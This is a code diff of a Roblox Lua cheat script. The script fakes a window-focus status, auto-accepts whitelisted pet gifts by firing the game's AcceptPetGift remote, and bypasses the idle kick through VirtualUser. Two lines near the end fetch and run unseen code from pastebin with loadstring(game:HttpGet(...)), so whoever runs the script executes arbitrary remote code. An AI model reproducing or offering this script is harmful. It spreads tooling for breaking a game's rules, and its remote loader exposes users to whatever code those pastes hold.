@@ -1,22 +1,19 @@
-if not game:IsLoaded() then 
-	game.Loaded:Wait()
+if not game:IsLoaded() then
+    game.Loaded:Wait()
 end
 
--- Services needed for the focus mimic
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 
--- Function to check and print focus status (always reports "IN FOCUS")
 local function checkActivityStatus()
     print("Roblox window is IN FOCUS.")
 end
 
--- Periodically update the status to always be "in focus" in the console.
 RunService.Heartbeat:Connect(function()
-    local currentStatusIsInactive = false 
-    local lastStatus = _G.RobloxFocusStatus 
+    local currentStatusIsInactive = false
+    local lastStatus = _G.RobloxFocusStatus
 
-    if lastStatus == nil then 
+    if lastStatus == nil then
         checkActivityStatus()
         _G.RobloxFocusStatus = currentStatusIsInactive
     elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
@@ -25,30 +22,27 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
--- Initial check when the script starts for console output
 checkActivityStatus()
 
-local a=game:GetService("ReplicatedStorage")
-local b=a:WaitForChild("GameEvents")
-local c=b:WaitForChild("GiftPet")
-local d=b:WaitForChild("AcceptPetGift")
+local PET_TO_CLAIM = _G.Pets
+local a = game:GetService("ReplicatedStorage")
+local b = a:WaitForChild("GameEvents")
+local c = b:WaitForChild("GiftPet")
+local d = b:WaitForChild("AcceptPetGift")
 
-PET_TO_CLAIM = Pets
+print("Auto-Accept Script: Hooked and ready. Waiting for gifts...")
 
-c.OnClientEvent:Connect(function(e,f,g)
-    -- Extract just the pet name, removing "[KG]" or "[Age]" parts
-    local petName = f:match("^(.-) %[") or f -- Get everything before first '[' or the whole string
-    petName = petName:gsub("^%s+", ""):gsub("%s+$", "") -- Trim leading/trailing whitespace
-
-    -- Check if the extracted petName exists in the PETS_TO_CLAIM list
-    if table.find(PETS_TO_CLAIM, petName) then
-        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...",f,g))
+c.OnClientEvent:Connect(function(e, f, g)
+    local petName = f:match("^(.-) %[") or f
+    petName = petName:gsub("^%s+", ""):gsub("%s+$", "")
+    if table.find(PET_TO_CLAIM, petName) then
+        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...", f, g))
         pcall(function()
-            d:FireServer(true,e)
-            print("Auto-Accept: Successfully accepted gift with ID: "..tostring(e))
+            d:FireServer(true, e)
+            print("Auto-Accept: Successfully accepted gift with ID: " .. tostring(e))
         end)
     else
-        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).",f,g))
+        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).", f, g))
     end
 end)
 
@@ -58,7 +52,6 @@ end
 
 loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()
-
 
 local bb = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:Connect(function()
